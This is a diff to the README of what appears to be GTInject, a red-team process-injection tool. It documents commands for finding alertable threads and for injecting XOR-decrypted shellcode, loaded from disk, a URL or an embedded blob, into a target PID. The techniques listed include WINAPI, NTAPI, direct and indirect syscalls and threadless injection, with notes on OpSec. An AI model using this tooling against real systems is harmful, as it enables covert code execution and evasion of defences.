@@ -30,15 +30,14 @@ This is intended to help you use the injection option later with better OpSec.
        GTInject.exe threads
 
 
-This will list all threads and their current execution state.
+This will list alertable threads in all processes that you have access to. This is intended to help identify alertable threads, for injection options like QueueUserAPC.
 
-This is intended to help identify alertable threads, for injection options like QueueUserAPC.
-It will show processes you have access to, and any threads in the following states:
-- Wait
-- Suspended
-- Delay Execution
+By default, it filters out low and untrusted process integrities. 
 
-Optionally run `GTInject.exe threads false` to see unfiltered results. By default, shows Medium integrity processes. 
+Options include `GTinject.exe threads <all or alertable> <optional PID filter>` 
+
+So you could show all threads in a process with `GTInject.exe threads all 4321`
+
 
 ## Inject   -- choose a process injection method
 
@@ -46,21 +45,16 @@ Optionally run `GTInject.exe threads false` to see unfiltered results. By defaul
 
        GTInject.exe inject 100 100 SecretKey123 disk "C:\path\to\xordShellcode.file" 1234 321
 
-Choose a technique for allocating the memory from your options below.
+Choose a technique integer for allocating the memory.
 
-Then choose a technique for executing the thread from your options below.
+Then choose a technique integer for executing the thread.
 
-Enter the XorKey to decrypt it with, the same one you used to encrypt the shellcode earlier.
+Enter the XorKey to decrypt it with, the same one you used to encrypt the shellcode using the **encrypt** module.
 
 Specify a location type where the encrypted shellcode is stored. Acceptable values are
-- disk
-- url
-- embedded
-
-Specify the path to that shellcode
-- "C:\path\to\shellcode.file"
-- https://example.com/shellcode.b64file
-- 0 (embedded)
+- embedded 0
+- url https://example.globetech.biz/hostedShellcode.b64
+- disk 'C:\path\to\xord-shellcode.bin'
 
 Specify the PID you want to inject into.
 
@@ -70,7 +64,7 @@ OPTIONALLY specify the TID (not all options need a Thread ID).
 - 100 Series - WINAPI
 - 200 Series - NTAPI 
 - 300 Series - Syscalls
-- 400 Series - Misc Techniques
+- 400 Series - Misc or Novel Techniques
 
 ## Memory Options
         100. WINAPI  -- VirtualAllocEx, WriteProcessMemory
@@ -83,21 +77,14 @@ OPTIONALLY specify the TID (not all options need a Thread ID).
 
 ## ThreadExec Options
         100. WINAPI  -- CreateRemoteThread
-        101. WINAPI  -- QueueUserAPC, ResumeThread
+        101. WINAPI  -- QueueUserAPC, ResumeThread - Must Specify Thread ID
+        102. WINAPI  -- GetThreadContext, SetThreadContext - Thread ID Optional
         200. NTAPI   -- NtCreateThreadEx
         201. NTAPI   -- RtlCreateUserThread
-        202. NTAPI   -- NtQueueApcThread, NtResumeThread
+        202. NTAPI   -- NtQueueApcThread, NtResumeThread - Must Specify Thread ID
         300. SysCall -- Direct, NtCreateThreadEx
-        301. SysCall -- Direct, NtQueueApcThread, NtResumeThread
+        301. SysCall -- Direct, NtQueueApcThread, NtResumeThread - Must Specify Thread ID
         302. SysCall -- Indirect, NtCreateThreadEx
-        303. SysCall -- Indirect, NtQueueApcThread, NtResumeThread
+        303. SysCall -- Indirect, NtQueueApcThread, NtResumeThread - Must Specify Thread ID
         400. Novel   -- ThreadlessInject, CreateEventW - does not honor memory option
         401. Novel   -- ThreadlessInject, LoadLibraryExW - does not honor memory option
-
-# ToDo
-- Obvious, add more techniques
-  - for each technique, build in as many call categories as possible
-- Build 400 series logic : *novel injection methods*
-  - 400 series breaks the 3 primitives - determine flow and if additional modules are needed
-- Better ReadMe
-  - usage video
